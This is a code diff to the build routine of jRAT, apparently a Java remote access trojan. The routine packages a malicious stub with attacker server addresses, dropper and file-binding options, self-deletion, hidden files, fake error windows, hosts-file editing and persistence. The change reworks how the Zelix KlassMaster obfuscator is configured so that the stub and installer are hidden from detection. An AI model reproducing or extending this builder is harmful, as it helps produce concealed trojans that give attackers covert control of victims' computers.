@@ -7,6 +7,7 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.util.Enumeration;
 import java.util.HashMap;
+import java.util.Map;
 import java.util.Random;
 import java.util.jar.JarFile;
 import java.util.zip.ZipEntry;
@@ -34,6 +35,8 @@ import pro.jrat.common.crypto.EncryptionKey;
 import pro.jrat.common.hash.Md5;
 import pro.jrat.common.hash.Sha1;
 
+import com.redpois0n.zkmlib.Configuration;
+
 public class Build {
 
 	public static void copy(InputStream input, OutputStream output) throws Exception {
@@ -45,9 +48,11 @@ public class Build {
 	}
 
 	@SuppressWarnings("resource")
-	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, EncryptionKey key, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, boolean obfuscate) {
+	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, EncryptionKey key, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, Configuration zkm) {
 		listener.start();
 
+		boolean obfuscate = zkm != null;
+		
 		if (!file.getName().toLowerCase().endsWith(".jar")) {
 			file = new File(file.getAbsolutePath() + ".jar");
 		}
@@ -105,7 +110,7 @@ public class Build {
 				entry = new ZipEntry("config.dat");
 				outputStub.putNextEntry(entry);
 
-				HashMap<String, Object> config = new HashMap<String, Object>();
+				Map<String, Object> config = new HashMap<String, Object>();
 
 				config.put("addresses", addressString);
 				config.put("id", id);
@@ -223,9 +228,11 @@ public class Build {
 			
 			if (obfuscate) {
 				if (dropper) {
-					ZkmUtils.obfuscateAtBuild(output, tempStubCleanJar, listener);
+					zkm.setInput(output);
+					zkm.setOutput(tempStubCleanJar);
+					ZkmUtils.obfuscateAtBuild(zkm, listener);
 				} else {
-					ZkmUtils.obfuscateAtBuild(output, file, listener);
+					ZkmUtils.obfuscateAtBuild(zkm, listener);
 				}
 			}
 
@@ -236,7 +243,9 @@ public class Build {
 
 				if (obfuscate) {
 					File temp = File.createTempFile("jrat-build-temp-obfuscated-installer", ".jar");
-					ZkmUtils.obfuscateAtBuild(Files.getInstaller(), temp, listener);
+					zkm.setInput(Files.getInstaller());
+					zkm.setOutput(temp);
+					ZkmUtils.obfuscateAtBuild(zkm, listener);
 					inputStub = new ZipFile(temp);
 				} else {
 					inputStub = new ZipFile(Files.getInstaller());
